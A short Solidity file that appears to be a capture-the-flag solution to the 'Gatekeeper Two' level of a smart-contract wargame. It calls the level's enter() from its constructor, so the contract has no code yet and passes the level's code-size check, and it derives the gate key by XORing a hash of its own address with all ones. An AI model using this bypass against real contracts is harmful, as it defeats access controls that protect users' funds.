// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../instances/Ilevel14.sol";

contract GateKeeperTwo {
    constructor() {
        GatekeeperTwo level14 = GatekeeperTwo(
            0xb3E840424e79b94915273A10e57555652c02161c
        );
        bytes8 myKey = bytes8(
            uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^
                ((uint64(0xffffffffffffffff)))
        );

        level14.enter(myKey);
    }
}
